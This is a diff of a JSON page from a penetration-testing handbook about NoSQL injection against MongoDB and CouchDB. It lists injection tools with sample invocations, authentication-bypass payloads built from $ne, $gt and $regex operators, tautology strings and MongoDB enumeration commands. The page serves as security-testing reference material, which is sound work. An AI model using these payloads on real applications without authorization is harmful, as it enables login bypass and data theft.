@@ -1,5 +1,5 @@
 {
-    "title": "NoSQL (MongoDB, CouchDB)",
+    "title": "NoSQL Injection (MongoDB, CouchDB)",
     "breadcrumb": [
         {
             "title": "Enumeration",
@@ -12,43 +12,113 @@
     ],
     "sections": [
         {
-            "heading": "Mongobleed https://github.com/joe-desimone/mongobleed",
-            "type": "paragraph",
-            "content": "# https://github.com/codingo/NoSQLMap\npython NoSQLMap.py\n# https://github.com/torque59/Nosql-Exploitation-Framework\npython nosqlframework.py -h\n# https://github.com/Charlie-belmer/nosqli\nnosqli scan -t http://localhost:4000/user/lookup?username=test\n# https://github.com/FSecureLABS/N1QLMap\n./n1qlMap.py http://localhost:3000 --request examplerequest1.txt --keyword beer-sample --extract travel-sample\n# Payload:\n' || 'a'=='a\nmongodbserver:port/status?text=1\n# in URL\nusername[$ne]=toto&password[$ne]=toto\n##in JSON\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}\n- Trigger MongoDB syntax error -> ' \" \\ ; { }\n- Insert logic -> ' || '1' == '1' ; //\n- Comment out -> //\n- Operators -> $where $gt $lt $ne $regex\n- Mongo commands -> db.getCollectionNames()\n```"
+            "type": "hint",
+            "variant": "info",
+            "content": "NoSQL injection is a vulnerability where an attacker can interfere with the queries that an application makes to a NoSQL database. It often allows bypassing authentication, extracting data, or even executing system commands in certain environments like MongoDB's server-side JavaScript."
+        },
+        {
+            "heading": "Automated Tools",
+            "type": "code_block",
+            "content": [
+                "# --- NoSQL Injection Frameworks ---",
+                "NoSQLMap          # python NoSQLMap.py",
+                "nosqli            # nosqli scan -t http://target.com/api?id=test",
+                "N1QLMap           # For Couchbase N1QL injection",
+                "Mongobleed        # Information leakage in MongoDB",
+                "Nosql-Exploitation-Framework # Comprehensive exploitation suite"
+            ]
+        },
+        {
+            "heading": "Auth Bypass & Logic Payloads",
+            "type": "code_block",
+            "content": [
+                "# --- In URL / Form Data ---",
+                "username[$ne]=toto&password[$ne]=toto   # $ne = Not Equal",
+                "username[$gt]=&password[$gt]=          # $gt = Greater Than",
+                "username[$regex]=.*&password[$regex]=.*",
+                "",
+                "# --- In JSON Payloads ---",
+                "{ \"username\": { \"$ne\": null }, \"password\": { \"$ne\": null } }",
+                "{ \"username\": { \"$gt\": \"\" }, \"password\": { \"$gt\": \"\" } }",
+                "{ \"username\": { \"$regex\": \".*\" }, \"password\": { \"$regex\": \".*\" } }",
+                "",
+                "# --- Tautologies & Logic ---",
+                "' || 'a'=='a",
+                "' || '1' == '1' ; //",
+                "true, $where: '1 == 1'"
+            ]
+        },
+        {
+            "heading": "Syntax & Commands",
+            "type": "code_block",
+            "content": [
+                "# --- Detection Characters ---",
+                "Trigger syntax errors: ' \" \\ ; { } ( )",
+                "Comment characters: //, <!--",
+                "",
+                "# --- Common Operators ---",
+                "$where, $gt, $lt, $ne, $regex, $in, $nin, $exists",
+                "",
+                "# --- Useful MongoDB Commands ---",
+                "db.getCollectionNames()      # List collections",
+                "db.users.find()              # List all users",
+                "db.version()                 # Get version",
+                "mongodbserver:port/status    # Internal status page"
+            ]
+        },
+        {
+            "heading": "External Resources",
+            "type": "links",
+            "links": [
+                {
+                    "title": "Intigriti: Exploiting NoSQL Injection",
+                    "url": "https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities"
+                },
+                {
+                    "title": "NoSQLMap GitHub",
+                    "url": "https://github.com/codingo/NoSQLMap"
+                },
+                {
+                    "title": "Charlie Belmer: NoSQLi Tool",
+                    "url": "https://github.com/Charlie-belmer/nosqli"
+                }
+            ]
+        },
+        {
+            "heading": "Related Topics",
+            "type": "links",
+            "links": [
+                {
+                    "title": "SQL Injection - Relational database attacks",
+                    "url": "/enumeration/web/sqli"
+                },
+                {
+                    "title": "Prototype Pollution - Object manipulation",
+                    "url": "/enumeration/web/prototype-pollution"
+                },
+                {
+                    "title": "Deserialization Attacks",
+                    "url": "/enumeration/web/deserialization"
+                }
+            ]
         }
     ],
     "images": [
         {
             "description": "GitHub icon",
             "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron down icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Hashtag icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron left icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
-        },
-        {
-            "description": "Chevron right icon",
-            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
         }
     ],
     "metadata": {
-        "last_updated": "2026-01-12T13:03:54.463Z",
+        "last_updated": "2026-04-23T00:07:35Z",
         "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/nosql-and-and-mongodb.md",
         "previous_page": {
-            "title": "Drupal",
-            "url": "/enumeration/webservices/drupal"
+            "title": "Symfony & Twig",
+            "url": "/enumeration/webservices/symfony-and-and-twig"
         },
         "next_page": {
-            "title": "PHP",
-            "url": "/enumeration/webservices/php"
+            "title": "Microsoft Exchange (OWA)",
+            "url": "/enumeration/webservices/owa"
         }
     }
 }
